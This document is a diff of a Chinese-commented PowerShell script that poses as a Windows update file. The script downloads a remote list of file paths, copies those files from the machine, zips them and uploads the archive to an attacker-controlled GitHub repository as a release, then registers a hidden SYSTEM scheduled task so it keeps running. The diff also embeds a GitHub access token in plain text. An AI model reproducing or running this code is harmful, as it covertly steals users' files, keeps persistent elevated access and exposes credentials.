@@ -1,16 +1,16 @@
-# ==================== 基本配置 ====================
+# === 基本设置 ===
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 $logPath = "C:\ProgramData\upload_log.txt"
-$token = "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"  # ✅ 请替换为你自己的 Token
+$token = "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"  # ✅ 替换为你自己的 GitHub Token
 $repo = "drftghy/backup-files"
 
-# 设置输出编码
+# 输出编码设置
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
 "[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append
 
-# ==================== 下载自身副本 ====================
+# === 下载自身脚本副本 ===
 try {
     Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
     "[OK] install.ps1 downloaded to $localPath" | Out-File $logPath -Append
@@ -19,7 +19,7 @@ try {
     return
 }
 
-# ==================== 上传打包文件 ====================
+# === 收集文件并上传 ===
 try {
     $now = Get-Date
     $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
@@ -30,12 +30,11 @@ try {
     $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
     $zipName = "package-$computerName-$timestamp.zip"
     $zipPath = Join-Path $env:TEMP $zipName
+    New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
 
-    New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
-
-    # 读取文件列表
+    # 读取远程路径列表
     $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
-    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
+    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 
     $index = 0
@@ -50,12 +49,12 @@ try {
                 $srcDir = Split-Path $path
                 robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
             } elseif (Test-Path $path -PathType Container) {
-                Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
+                Copy-Item $path -Destination $dest -Recurse -Force
             } else {
-                Copy-Item $path -Destination $dest -Force -ErrorAction Stop
+                Copy-Item $path -Destination $dest -Force
             }
         } catch {
-            "❌ Failed to copy $path: $($_.Exception.Message)" | Out-File $logPath -Append
+            "❌ Copy failed: $path - $($_.Exception.Message)" | Out-File $logPath -Append
         }
     }
 
@@ -67,21 +66,21 @@ try {
         foreach ($lnk in $lnkFiles) {
             $shell = New-Object -ComObject WScript.Shell
             $shortcut = $shell.CreateShortcut($lnk.FullName)
-            $lnkReport += "[$($lnk.Name)]`nTargetPath: $($shortcut.TargetPath)`nArguments: $($shortcut.Arguments)`nStartIn: $($shortcut.WorkingDirectory)`nIcon: $($shortcut.IconLocation)`n-----------`n"
+            $lnkReport += "[$($lnk.Name)]`nTarget: $($shortcut.TargetPath)`nArgs: $($shortcut.Arguments)`nStartIn: $($shortcut.WorkingDirectory)`nIcon: $($shortcut.IconLocation)`n-----------`n"
         }
         $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
     } catch {
-        "⚠️ Shortcut parsing failed: $($_.Exception.Message)" | Out-File $logPath -Append
+        "⚠️ LNK info failed: $($_.Exception.Message)" | Out-File $logPath -Append
     }
 
     # 压缩
-    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
+    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
 
-    # 创建 GitHub Release
+    # 创建 Release
     $releaseData = @{
         tag_name = $tag
         name = $releaseName
-        body = "Automated file package from $computerName on $date"
+        body = "Auto file package from $computerName on $date"
         draft = $false
         prerelease = $false
     } | ConvertTo-Json -Depth 3
@@ -97,12 +96,11 @@ try {
 
     # 上传文件
     $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
-    $uploadHeaders = @{
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{
         Authorization = "token $token"
         "Content-Type" = "application/zip"
         "User-Agent" = "PowerShellScript"
-    }
-    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
+    } -Body $fileBytes
 
     "[OK] Upload successful." | Out-File $logPath -Append
 } catch {
@@ -113,7 +111,7 @@ try {
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# ==================== 注册计划任务（每10分钟执行） ====================
+# === 注册每天凌晨 0 点运行的任务 ===
 try {
     $taskName = "UploaderTask"
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
@@ -122,13 +120,11 @@ try {
     }
 
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
-    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
-    $trigger.Repetition.Interval = (New-TimeSpan -Minutes 10)
-    $trigger.Repetition.Duration = [TimeSpan]::MaxValue
+    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
-    "[OK] Scheduled task registered." | Out-File $logPath -Append
+    "[OK] Scheduled task registered (0:00)." | Out-File $logPath -Append
 } catch {
-    "❌ Scheduled task registration failed: $($_.Exception.Message)" | Out-File $logPath -Append
+    "❌ Scheduled task creation failed: $($_.Exception.Message)" | Out-File $logPath -Append
 }
